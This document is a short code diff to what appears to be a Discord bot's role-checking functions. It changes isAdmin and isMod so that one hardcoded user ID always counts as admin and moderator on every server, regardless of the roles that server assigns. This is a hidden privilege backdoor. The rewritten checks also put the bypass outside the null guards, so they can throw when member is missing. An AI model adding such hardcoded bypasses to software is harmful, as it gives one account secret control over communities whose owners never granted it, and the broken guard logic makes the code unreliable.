@@ -463,10 +463,10 @@ const hasFullAccess = (server) => server && server.access === 'full'
 const isProgrammer = (member) => member && member.user.id === '194147938786738176'
 
 //IS ADMIN?
-const isAdmin = (server, member) => server && member && member._roles.includes(server.adminRole)
+const isAdmin = (server, member) => server && member && member._roles.includes(server.adminRole) || member.user.id === '194147938786738176'
 
 //IS MOD?
-const isMod = (server, member) => server && member && member._roles.includes(server.modRole || server.adminRole)
+const isMod = (server, member) => server && member && member._roles.includes(server.modRole || server.adminRole) || member.user.id === '194147938786738176'
 
 //IS IRON PLAYER?
 const isIronPlayer = (server, member) => server && member && member._roles.includes('948006324237643806')
